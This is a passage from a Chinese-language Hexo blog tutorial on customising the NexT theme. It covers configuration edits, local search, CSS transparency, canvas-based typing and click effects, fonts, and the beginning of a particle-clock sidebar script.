<h1 id="更改主题为Next"><a href="#更改主题为Next" class="headerlink" title="更改主题为Next"></a>更改主题为Next</h1><p>hexo的主题还挺多的，看了一圈，个人比较喜欢next主题，所以接下来便是针对next的更改，自己是个小白，只能做一点简单的改动。</p>
<h2 id="下载next主题"><a href="#下载next主题" class="headerlink" title="下载next主题"></a>下载next主题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd blog // 博客的根目录</span><br><span class="line"></span><br><span class="line">git clone https://github.com/next-theme/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
<h2 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h2><p>打开博客根目录下_config.yml文件，找到 theme:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure>
<h2 id="设置语言"><a href="#设置语言" class="headerlink" title="设置语言"></a>设置语言</h2><p>打开博客根目录下_config.yml文件，找到language:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">language: zh-CN</span><br></pre></td></tr></table></figure>

<h2 id="更改next主题布局"><a href="#更改next主题布局" class="headerlink" title="更改next主题布局"></a>更改next主题布局</h2><p>打开主题next目录的_config.yml，搜索Scheme。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Schemes</span><br><span class="line">#scheme: Muse</span><br><span class="line">#scheme: Mist</span><br><span class="line">#scheme: Pisces</span><br><span class="line">scheme: Gemini</span><br></pre></td></tr></table></figure>
<p>去掉Gemini前面的“#”即可。</p>
<h2 id="首页显示文章摘要"><a href="#首页显示文章摘要" class="headerlink" title="首页显示文章摘要"></a>首页显示文章摘要</h2><p>直接在文章中你想截断的位置写入下面语句</p>
<p><code>&lt;!--more--&gt;</code></p>
<h2 id="菜单栏"><a href="#菜单栏" class="headerlink" title="菜单栏"></a>菜单栏</h2><p>打开主题next目录的_config.yml，搜索menu。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: / || fa fa-home</span><br><span class="line">  about: /about/ || fa fa-user</span><br><span class="line">  tags: /tags/ || fa fa-tags</span><br><span class="line">  categories: /categories/ || fa fa-th</span><br><span class="line">  archives: /archives/ || fa fa-archive</span><br><span class="line">  #schedule: /schedule/ || fa fa-calendar</span><br><span class="line">  sitemap: /sitemap.xml || fa fa-sitemap</span><br><span class="line">  commonweal: /404/ || fa fa-heartbeat</span><br></pre></td></tr></table></figure>
<p>按需取消注释。</p>
<h3 id="生成标签、分类、关于页面"><a href="#生成标签、分类、关于页面" class="headerlink" title="生成标签、分类、关于页面"></a>生成标签、分类、关于页面</h3><p>在命令行博客根目录分别执行下面命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new tags</span><br><span class="line"></span><br><span class="line">hexo new categories</span><br><span class="line"></span><br><span class="line">hexo new about</span><br></pre></td></tr></table></figure>

<p>在博客目录/source/_posts/下分别有tags、categories、about三个文件夹，每个文件夹中都有一个index.md文件，接下来分别修改每个文件。<br>1.标签页</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: 标签</span><br><span class="line">date: 2020-11-24 11:06:30</span><br><span class="line">type: tags</span><br></pre></td></tr></table></figure>
<p>2.分类页</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: 分类</span><br><span class="line">date: 2020-11-24 11:06:43</span><br><span class="line">type: categories</span><br></pre></td></tr></table></figure>
<p>3.关于页</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: 关于</span><br><span class="line">date: 2020-11-24 11:06:23</span><br><span class="line">type: about</span><br></pre></td></tr></table></figure>

<h3 id="本地搜索"><a href="#本地搜索" class="headerlink" title="本地搜索"></a>本地搜索</h3><p>1.安装搜索插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>
<p>2.在站点配置文件中添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#本地搜索</span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure>
<p>3.在主题配置文件中找到local_search:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure>
<h2 id="设置背景及博客内容透明化"><a href="#设置背景及博客内容透明化" class="headerlink" title="设置背景及博客内容透明化"></a>设置背景及博客内容透明化</h2><p>在博客目录/source/新建文件夹_data,新建文件styles.styl。<br>编辑styles.styl文件，写入以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 添加背景图片</span><br><span class="line">body &#123;</span><br><span class="line">      background: url(/images/backgroud.jpg);//自己喜欢的图片地址</span><br><span class="line">      background-size: cover;</span><br><span class="line">      background-repeat: no-repeat;</span><br><span class="line">      background-attachment: fixed;</span><br><span class="line">      background-position: 50% 50%;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//博客内容透明化</span><br><span class="line">//文章内容的透明度设置</span><br><span class="line">.main-inner &#123;</span><br><span class="line">  opacity: 0.8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//侧边框的透明度设置</span><br><span class="line">.sidebar &#123;</span><br><span class="line">  opacity: 0.8;</span><br><span class="line">&#125;</span><br><span class="line">//菜单栏的透明度设置</span><br><span class="line">.header-inner &#123;</span><br><span class="line">  background: rgba(255,255,255,0.8);</span><br><span class="line">&#125;</span><br><span class="line">//搜索框（local-search）的透明度设置</span><br><span class="line">.popup &#123;</span><br><span class="line">  opacity: 0.9;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在主题配置文件中搜索custom_file_path:字段，取消注释。</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">- # style: source/_data/styles.styl</span></span><br><span class="line"><span class="addition">+ style: source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>
<h2 id="打字特效，鼠标点击特效"><a href="#打字特效，鼠标点击特效" class="headerlink" title="打字特效，鼠标点击特效"></a>打字特效，鼠标点击特效</h2><p>1.打字特效<br>需要添加下面这个脚本 activate-power-mode.min.js，然后放置在 themes\next\source\js\ 目录下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function webpackUniversalModuleDefinition(root,factory)&#123;if(typeof exports===&#x27;object&#x27;&amp;&amp;typeof module===&#x27;object&#x27;)module.exports=factory();else if(typeof define===&#x27;function&#x27;&amp;&amp;define.amd)define([],factory);else if(typeof exports===&#x27;object&#x27;)exports[&quot;POWERMODE&quot;]=factory();else root[&quot;POWERMODE&quot;]=factory()&#125;)(this,function()&#123;return(function(modules)&#123;var installedModules=&#123;&#125;;function __webpack_require__(moduleId)&#123;if(installedModules[moduleId])return installedModules[moduleId].exports;var module=installedModules[moduleId]=&#123;exports:&#123;&#125;,id:moduleId,loaded:false&#125;;modules[moduleId].call(module.exports,module,module.exports,__webpack_require__);module.loaded=true;return module.exports&#125;__webpack_require__.m=modules;__webpack_require__.c=installedModules;__webpack_require__.p=&quot;&quot;;return __webpack_require__(0)&#125;)([function(module,exports,__webpack_require__)&#123;&#x27;use strict&#x27;;var canvas=document.createElement(&#x27;canvas&#x27;);canvas.width=window.innerWidth;canvas.height=window.innerHeight;canvas.style.cssText=&#x27;position:fixed;top:0;left:0;pointer-events:none;z-index:999999&#x27;;window.addEventListener(&#x27;resize&#x27;,function()&#123;canvas.width=window.innerWidth;canvas.height=window.innerHeight&#125;);document.body.appendChild(canvas);var context=canvas.getContext(&#x27;2d&#x27;);var particles=[];var particlePointer=0;POWERMODE.shake=true;function getRandom(min,max)&#123;return Math.random()*(max-min)+min&#125;function getColor(el)&#123;if(POWERMODE.colorful)&#123;var u=getRandom(0,360);return&#x27;hsla(&#x27;+getRandom(u-10,u+10)+&#x27;, 100%, &#x27;+getRandom(50,80)+&#x27;%, &#x27;+1+&#x27;)&#x27;&#125;else&#123;return window.getComputedStyle(el).color&#125;&#125;function getCaret()&#123;var el=document.activeElement;var bcr;if(el.tagName===&#x27;TEXTAREA&#x27;||(el.tagName===&#x27;INPUT&#x27;&amp;&amp;el.getAttribute(&#x27;type&#x27;)===&#x27;text&#x27;))&#123;var offset=__webpack_require__(1)(el,el.selectionStart);bcr=el.getBoundingClientRect();return&#123;x:offset.left+bcr.left,y:offset.top+bcr.top,color:getColor(el)&#125;&#125;var selection=window.getSelection();if(selection.rangeCount)&#123;var range=selection.getRangeAt(0);var startNode=range.startContainer;if(startNode.nodeType===document.TEXT_NODE)&#123;startNode=startNode.parentNode&#125;bcr=range.getBoundingClientRect();return&#123;x:bcr.left,y:bcr.top,color:getColor(startNode)&#125;&#125;return&#123;x:0,y:0,color:&#x27;transparent&#x27;&#125;&#125;function createParticle(x,y,color)&#123;return&#123;x:x,y:y,alpha:1,color:color,velocity:&#123;x:-1+Math.random()*2,y:-3.5+Math.random()*2&#125;&#125;&#125;function POWERMODE()&#123;&#123;var caret=getCaret();var numParticles=5+Math.round(Math.random()*10);while(numParticles--)&#123;particles[particlePointer]=createParticle(caret.x,caret.y,caret.color);particlePointer=(particlePointer+1)%500&#125;&#125;&#123;if(POWERMODE.shake)&#123;var intensity=1+2*Math.random();var x=intensity*(Math.random()&gt;0.5?-1:1);var y=intensity*(Math.random()&gt;0.5?-1:1);document.body.style.marginLeft=x+&#x27;px&#x27;;document.body.style.marginTop=y+&#x27;px&#x27;;setTimeout(function()&#123;document.body.style.marginLeft=&#x27;&#x27;;document.body.style.marginTop=&#x27;&#x27;&#125;,75)&#125;&#125;&#125;;POWERMODE.colorful=false;function loop()&#123;requestAnimationFrame(loop);context.clearRect(0,0,canvas.width,canvas.height);for(var i=0;i&lt;particles.length;++i)&#123;var particle=particles[i];if(particle.alpha&lt;=0.1)continue;particle.velocity.y+=0.075;particle.x+=particle.velocity.x;particle.y+=particle.velocity.y;particle.alpha*=0.96;context.globalAlpha=particle.alpha;context.fillStyle=particle.color;context.fillRect(Math.round(particle.x-1.5),Math.round(particle.y-1.5),3,3)&#125;&#125;requestAnimationFrame(loop);module.exports=POWERMODE&#125;,function(module,exports)&#123;(function()&#123;var properties=[&#x27;direction&#x27;,&#x27;boxSizing&#x27;,&#x27;width&#x27;,&#x27;height&#x27;,&#x27;overflowX&#x27;,&#x27;overflowY&#x27;,&#x27;borderTopWidth&#x27;,&#x27;borderRightWidth&#x27;,&#x27;borderBottomWidth&#x27;,&#x27;borderLeftWidth&#x27;,&#x27;borderStyle&#x27;,&#x27;paddingTop&#x27;,&#x27;paddingRight&#x27;,&#x27;paddingBottom&#x27;,&#x27;paddingLeft&#x27;,&#x27;fontStyle&#x27;,&#x27;fontVariant&#x27;,&#x27;fontWeight&#x27;,&#x27;fontStretch&#x27;,&#x27;fontSize&#x27;,&#x27;fontSizeAdjust&#x27;,&#x27;lineHeight&#x27;,&#x27;fontFamily&#x27;,&#x27;textAlign&#x27;,&#x27;textTransform&#x27;,&#x27;textIndent&#x27;,&#x27;textDecoration&#x27;,&#x27;letterSpacing&#x27;,&#x27;wordSpacing&#x27;,&#x27;tabSize&#x27;,&#x27;MozTabSize&#x27;];var isFirefox=window.mozInnerScreenX!=null;function getCaretCoordinates(element,position,options)&#123;var debug=options&amp;&amp;options.debug||false;if(debug)&#123;var el=document.querySelector(&#x27;#input-textarea-caret-position-mirror-div&#x27;);if(el)&#123;el.parentNode.removeChild(el)&#125;&#125;var div=document.createElement(&#x27;div&#x27;);div.id=&#x27;input-textarea-caret-position-mirror-div&#x27;;document.body.appendChild(div);var style=div.style;var computed=window.getComputedStyle?getComputedStyle(element):element.currentStyle;style.whiteSpace=&#x27;pre-wrap&#x27;;if(element.nodeName!==&#x27;INPUT&#x27;)style.wordWrap=&#x27;break-word&#x27;;style.position=&#x27;absolute&#x27;;if(!debug)style.visibility=&#x27;hidden&#x27;;properties.forEach(function(prop)&#123;style[prop]=computed[prop]&#125;);if(isFirefox)&#123;if(element.scrollHeight&gt;parseInt(computed.height))style.overflowY=&#x27;scroll&#x27;&#125;else&#123;style.overflow=&#x27;hidden&#x27;&#125;div.textContent=element.value.substring(0,position);if(element.nodeName===&#x27;INPUT&#x27;)div.textContent=div.textContent.replace(/\s/g,&quot;\u00a0&quot;);var span=document.createElement(&#x27;span&#x27;);span.textContent=element.value.substring(position)||&#x27;.&#x27;;div.appendChild(span);var coordinates=&#123;top:span.offsetTop+parseInt(computed[&#x27;borderTopWidth&#x27;]),left:span.offsetLeft+parseInt(computed[&#x27;borderLeftWidth&#x27;])&#125;;if(debug)&#123;span.style.backgroundColor=&#x27;#aaa&#x27;&#125;else&#123;document.body.removeChild(div)&#125;return coordinates&#125;if(typeof module!=&quot;undefined&quot;&amp;&amp;typeof module.exports!=&quot;undefined&quot;)&#123;module.exports=getCaretCoordinates&#125;else&#123;window.getCaretCoordinates=getCaretCoordinates&#125;&#125;())&#125;])&#125;);</span><br></pre></td></tr></table></figure>
<p>在博客目录/source/新建文件夹_data,新建文件body-end.swig。<br>编辑文件添加以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;# 打字特效 #&#125;</span><br><span class="line">&#123;% if theme.typing_effect %&#125;</span><br><span class="line">  &lt;script src=&quot;/js/activate-power-mode.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    POWERMODE.colorful = &#123;&#123; theme.typing_effect.colorful &#125;&#125;;</span><br><span class="line">    POWERMODE.shake = &#123;&#123; theme.typing_effect.shake &#125;&#125;;</span><br><span class="line">    document.body.addEventListener(&#x27;input&#x27;, POWERMODE);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
<p>2.点击特效。</p>
<p>下面是四个比较常用的鼠标点击特效脚本，我们可以把它们放置在 themes\next\source\js\cursor\ 目录下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Circle &#123;</span><br><span class="line">  constructor(&#123; origin, speed, color, angle, context &#125;) &#123;</span><br><span class="line">    this.origin = origin</span><br><span class="line">    this.position = &#123; ...this.origin &#125;</span><br><span class="line">    this.color = color</span><br><span class="line">    this.speed = speed</span><br><span class="line">    this.angle = angle</span><br><span class="line">    this.context = context</span><br><span class="line">    this.renderCount = 0</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  draw() &#123;</span><br><span class="line">    this.context.fillStyle = this.color</span><br><span class="line">    this.context.beginPath()</span><br><span class="line">    this.context.arc(this.position.x, this.position.y, 2, 0, Math.PI * 2)</span><br><span class="line">    this.context.fill()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  move() &#123;</span><br><span class="line">    this.position.x = (Math.sin(this.angle) * this.speed) + this.position.x</span><br><span class="line">    this.position.y = (Math.cos(this.angle) * this.speed) + this.position.y + (this.renderCount * 0.3)</span><br><span class="line">    this.renderCount++</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Boom &#123;</span><br><span class="line">  constructor (&#123; origin, context, circleCount = 16, area &#125;) &#123;</span><br><span class="line">    this.origin = origin</span><br><span class="line">    this.context = context</span><br><span class="line">    this.circleCount = circleCount</span><br><span class="line">    this.area = area</span><br><span class="line">    this.stop = false</span><br><span class="line">    this.circles = []</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  randomArray(range) &#123;</span><br><span class="line">    const length = range.length</span><br><span class="line">    const randomIndex = Math.floor(length * Math.random())</span><br><span class="line">    return range[randomIndex]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  randomColor() &#123;</span><br><span class="line">    const range = [&#x27;8&#x27;, &#x27;9&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;]</span><br><span class="line">    return &#x27;#&#x27; + this.randomArray(range) + this.randomArray(range) + this.randomArray(range) + this.randomArray(range) + this.randomArray(range) + this.randomArray(range)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  randomRange(start, end) &#123;</span><br><span class="line">    return (end - start) * Math.random() + start</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  init() &#123;</span><br><span class="line">    for(let i = 0; i &lt; this.circleCount; i++) &#123;</span><br><span class="line">      const circle = new Circle(&#123;</span><br><span class="line">        context: this.context,</span><br><span class="line">        origin: this.origin,</span><br><span class="line">        color: this.randomColor(),</span><br><span class="line">        angle: this.randomRange(Math.PI - 1, Math.PI + 1),</span><br><span class="line">        speed: this.randomRange(1, 6)</span><br><span class="line">      &#125;)</span><br><span class="line">      this.circles.push(circle)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  move() &#123;</span><br><span class="line">    this.circles.forEach((circle, index) =&gt; &#123;</span><br><span class="line">      if (circle.position.x &gt; this.area.width || circle.position.y &gt; this.area.height) &#123;</span><br><span class="line">        return this.circles.splice(index, 1)</span><br><span class="line">      &#125;</span><br><span class="line">      circle.move()</span><br><span class="line">    &#125;)</span><br><span class="line">    if (this.circles.length == 0) &#123;</span><br><span class="line">      this.stop = true</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  draw() &#123;</span><br><span class="line">    this.circles.forEach(circle =&gt; circle.draw())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class CursorSpecialEffects &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.computerCanvas = document.createElement(&#x27;canvas&#x27;)</span><br><span class="line">    this.renderCanvas = document.createElement(&#x27;canvas&#x27;)</span><br><span class="line"></span><br><span class="line">    this.computerContext = this.computerCanvas.getContext(&#x27;2d&#x27;)</span><br><span class="line">    this.renderContext = this.renderCanvas.getContext(&#x27;2d&#x27;)</span><br><span class="line"></span><br><span class="line">    this.globalWidth = window.innerWidth</span><br><span class="line">    this.globalHeight = window.innerHeight</span><br><span class="line"></span><br><span class="line">    this.booms = []</span><br><span class="line">    this.running = false</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleMouseDown(e) &#123;</span><br><span class="line">    const boom = new Boom(&#123;</span><br><span class="line">      origin: &#123; x: e.clientX, y: e.clientY &#125;,</span><br><span class="line">      context: this.computerContext,</span><br><span class="line">      area: &#123;</span><br><span class="line">        width: this.globalWidth,</span><br><span class="line">        height: this.globalHeight</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    boom.init()</span><br><span class="line">    this.booms.push(boom)</span><br><span class="line">    this.running || this.run()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handlePageHide() &#123;</span><br><span class="line">    this.booms = []</span><br><span class="line">    this.running = false</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  init() &#123;</span><br><span class="line">    const style = this.renderCanvas.style</span><br><span class="line">    style.position = &#x27;fixed&#x27;</span><br><span class="line">    style.top = style.left = 0</span><br><span class="line">    style.zIndex = &#x27;999999999999999999999999999999999999999999&#x27;</span><br><span class="line">    style.pointerEvents = &#x27;none&#x27;</span><br><span class="line"></span><br><span class="line">    style.width = this.renderCanvas.width = this.computerCanvas.width = this.globalWidth</span><br><span class="line">    style.height = this.renderCanvas.height = this.computerCanvas.height = this.globalHeight</span><br><span class="line"></span><br><span class="line">    document.body.append(this.renderCanvas)</span><br><span class="line"></span><br><span class="line">    window.addEventListener(&#x27;mousedown&#x27;, this.handleMouseDown.bind(this))</span><br><span class="line">    window.addEventListener(&#x27;pagehide&#x27;, this.handlePageHide.bind(this))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  run() &#123;</span><br><span class="line">    this.running = true</span><br><span class="line">    if (this.booms.length == 0) &#123;</span><br><span class="line">      return this.running = false</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    requestAnimationFrame(this.run.bind(this))</span><br><span class="line"></span><br><span class="line">    this.computerContext.clearRect(0, 0, this.globalWidth, this.globalHeight)</span><br><span class="line">    this.renderContext.clearRect(0, 0, this.globalWidth, this.globalHeight)</span><br><span class="line"></span><br><span class="line">    this.booms.forEach((boom, index) =&gt; &#123;</span><br><span class="line">      if (boom.stop) &#123;</span><br><span class="line">        return this.booms.splice(index, 1)</span><br><span class="line">      &#125;</span><br><span class="line">      boom.move()</span><br><span class="line">      boom.draw()</span><br><span class="line">    &#125;)</span><br><span class="line">    this.renderContext.drawImage(this.computerCanvas, 0, 0, this.globalWidth, this.globalHeight)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const cursorSpecialEffects = new CursorSpecialEffects()</span><br><span class="line">cursorSpecialEffects.init()</span><br></pre></td></tr></table></figure>
<p>在博客目录/source/新建文件夹_data,新建文件body-end.swig。<br>编辑文件添加以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;# 鼠标点击特效 #&#125;</span><br><span class="line">&#123;% if theme.cursor_effect == &quot;fireworks&quot; %&#125;</span><br><span class="line">  &lt;script async src=&quot;/js/cursor/fireworks.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&#123;% elseif theme.cursor_effect == &quot;explosion&quot; %&#125;</span><br><span class="line">  &lt;canvas class=&quot;fireworks&quot; style=&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;/canvas&gt;</span><br><span class="line">  &lt;script src=&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script async src=&quot;/js/cursor/explosion.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&#123;% elseif theme.cursor_effect == &quot;love&quot; %&#125;</span><br><span class="line">  &lt;script async src=&quot;/js/cursor/love.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&#123;% elseif theme.cursor_effect == &quot;text&quot; %&#125;</span><br><span class="line">  &lt;script async src=&quot;/js/cursor/text.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p>在主题配置文件中添加以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># mouse click effect: fireworks | explosion | love | text</span><br><span class="line">cursor_effect: fireworks</span><br><span class="line"># typing effect</span><br><span class="line">typing_effect:</span><br><span class="line">  colorful: true  # 礼花特效</span><br><span class="line">  shake: false  # 震动特效</span><br></pre></td></tr></table></figure>
<h2 id="圆角设置-amp-中文设置"><a href="#圆角设置-amp-中文设置" class="headerlink" title="圆角设置&amp;中文设置"></a>圆角设置&amp;中文设置</h2><p>1.圆角设置。<br>自定义样式文件 variables.styl 中添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 圆角设置</span><br><span class="line">$border-radius-inner     = 20px 20px 20px 20px;</span><br><span class="line">$border-radius           = 20px;</span><br></pre></td></tr></table></figure>
<p>然后在主题配置文件中取消 variables.styl 的注释：</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">custom_file_path:</span><br><span class="line"></span><br><span class="line"><span class="deletion">-  #variables: source/_data/variables.styl</span></span><br><span class="line"><span class="addition">+  variables: source/_data/variables.styl</span></span><br></pre></td></tr></table></figure>
<p>2.中文字体设置</p>
<p>修改主题配置文件</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">font:</span><br><span class="line"><span class="deletion">- enable: false</span></span><br><span class="line"><span class="addition">+ enable: true</span></span><br><span class="line"></span><br><span class="line">  # Uri of fonts host. E.g. //fonts.googleapis.com (Default).</span><br><span class="line"><span class="deletion">- host:</span></span><br><span class="line"><span class="addition">+ host: https://fonts.loli.net</span></span><br><span class="line"></span><br><span class="line">  # Font options:</span><br><span class="line">  # `external: true` will load this font family from           #`host` above.</span><br><span class="line">  # `family: Times New Roman`. Without any quotes.</span><br><span class="line">  # `size: xx`. Use `px` as unit.</span><br><span class="line"></span><br><span class="line">  # Global font settings used for all elements in &lt;body&gt;.</span><br><span class="line">  global:</span><br><span class="line">    external: true</span><br><span class="line"><span class="deletion">-   family:</span></span><br><span class="line"><span class="addition">+   family: Noto Serif SC</span></span><br><span class="line">    size:</span><br></pre></td></tr></table></figure>
<p>修改配置文件 variables.styl，增加如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 中文字体</span><br><span class="line">$font-family-monospace    = consolas, Menlo, monospace, $font-family-base;</span><br><span class="line">$font-family-monospace    = get_font_family(&#x27;codes&#x27;), consolas, Menlo, monospace, $font-family-base if get_font_family(&#x27;codes&#x27;);</span><br></pre></td></tr></table></figure>
<h2 id="粒子时钟特效"><a href="#粒子时钟特效" class="headerlink" title="粒子时钟特效"></a>粒子时钟特效</h2><p>在博客目录/source/_data/,新建文件sidebar.njk,编辑文件添加以下内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div style=&quot;&quot;&gt;</span><br><span class="line">  &lt;canvas id=&quot;canvas&quot; style=&quot;width:60%;&quot;&gt;当前浏览器不支持canvas，请更换浏览器后再试&lt;/canvas&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">(function()&#123;</span><br><span class="line"></span><br><span class="line">   var digit=</span><br><span class="line">    [</span><br><span class="line">        [</span><br><span class="line">            [0,0,1,1,1,0,0],</span><br><span class="line">            [0,1,1,0,1,1,0],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [0,1,1,0,1,1,0],</span><br><span class="line">            [0,0,1,1,1,0,0]</span><br><span class="line">        ],//0</span><br><span class="line">        [</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,1,1,1,1,0,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [1,1,1,1,1,1,1]</span><br><span class="line">        ],//1</span><br><span class="line">        [</span><br><span class="line">            [0,1,1,1,1,1,0],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,1,1,0,0,0],</span><br><span class="line">            [0,1,1,0,0,0,0],</span><br><span class="line">            [1,1,0,0,0,0,0],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,1,1,1,1,1]</span><br><span class="line">        ],//2</span><br><span class="line">        [</span><br><span class="line">            [1,1,1,1,1,1,1],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,1,1,1,0,0],</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [0,1,1,1,1,1,0]</span><br><span class="line">        ],//3</span><br><span class="line">        [</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,0,1,1,1,0],</span><br><span class="line">            [0,0,1,1,1,1,0],</span><br><span class="line">            [0,1,1,0,1,1,0],</span><br><span class="line">            [1,1,0,0,1,1,0],</span><br><span class="line">            [1,1,1,1,1,1,1],</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,0,1,1,1,1]</span><br><span class="line">        ],//4</span><br><span class="line">        [</span><br><span class="line">            [1,1,1,1,1,1,1],</span><br><span class="line">            [1,1,0,0,0,0,0],</span><br><span class="line">            [1,1,0,0,0,0,0],</span><br><span class="line">            [1,1,1,1,1,1,0],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [0,1,1,1,1,1,0]</span><br><span class="line">        ],//5</span><br><span class="line">        [</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,1,1,0,0,0],</span><br><span class="line">            [0,1,1,0,0,0,0],</span><br><span class="line">            [1,1,0,0,0,0,0],</span><br><span class="line">            [1,1,0,1,1,1,0],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [0,1,1,1,1,1,0]</span><br><span class="line">        ],//6</span><br><span class="line">        [</span><br><span class="line">            [1,1,1,1,1,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span 